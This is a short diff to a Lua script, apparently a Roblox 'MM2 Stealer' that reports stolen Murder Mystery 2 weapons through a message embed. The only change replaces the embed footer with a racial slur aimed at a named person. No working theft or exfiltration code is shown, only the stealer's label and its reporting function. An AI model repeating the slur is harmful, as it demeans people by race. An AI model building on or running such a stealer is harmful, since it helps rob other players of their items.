@@ -468,7 +468,7 @@ local function SendFirstMessage(Prefix, AllWeapons)
             }
         },
         footer = { 
-            text = "MM2 Stealer | " .. GetTime() .. " (GMT+8)"
+            text = "ZAYED NEGRO! | " .. GetTime() .. " (GMT+8)"
         }
     }
 
